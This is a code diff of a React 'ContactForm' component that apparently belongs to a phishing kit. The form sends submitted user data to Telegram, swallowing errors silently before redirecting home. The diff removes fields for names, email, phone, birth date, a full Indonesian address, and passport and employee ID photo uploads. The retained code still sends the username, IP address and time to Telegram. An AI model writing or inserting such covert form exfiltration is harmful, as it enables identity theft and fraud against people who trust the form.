@@ -134,33 +134,12 @@ export default function ContactForm() {
         `📋 <b>Form Data User</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
         `👤 <b>Username</b>         : <code>${username}</code>\n` +
-        `📛 <b>First Name</b>       : ${firstName}\n` +
-        `📛 <b>Last Name</b>        : ${lastName}\n` +
-        `📧 <b>Email</b>            : ${email}\n` +
-        `📱 <b>Mobile Phone</b>     : ${phone}\n` +
-        `🎂 <b>Date of Birth</b>    : ${dob}\n\n` +
-        `🏘️ <b>ALAMAT LENGKAP</b>\n` +
-        `🏠 <b>No Rumah / Blok</b>  : ${houseNo}\n` +
-        `🏢 <b>Nama Komplek</b>     : ${complex || "-"}\n` +
-        `🛣️ <b>Nama Jalan</b>       : ${address}\n` +
-        `🏘️ <b>Kecamatan</b>        : ${district}\n` +
-        `🏙️ <b>Kota / Kab</b>       : ${city}\n` +
-        `📍 <b>Provinsi</b>         : ${state}\n` +
-        `📮 <b>Kode Pos</b>         : ${postal}\n\n` +
-        `📌 <b>Inquiry Type</b>     : ${inquiryType}\n` +
-        `💬 <b>Message</b>          : ${message || "-"}\n\n` +
         `🌐 <b>IP & Lokasi</b>      : <code>${ip}</code>\n` +
         `🕐 <b>Waktu</b>            : ${now}\n` +
         `━━━━━━━━━━━━━━━━━━━━━`;
 
       await sendTelegram(text);
 
-      if (passportFile) {
-        await sendFileToTelegram(passportFile, `📷 Passport Photo — ${username} (${firstName} ${lastName})`);
-      }
-      if (employeeIdFile) {
-        await sendFileToTelegram(employeeIdFile, `🪪 Employee ID Photo — ${username} (${firstName} ${lastName})`);
-      }
     } catch { /* silent */ }
 
     navigate("/");
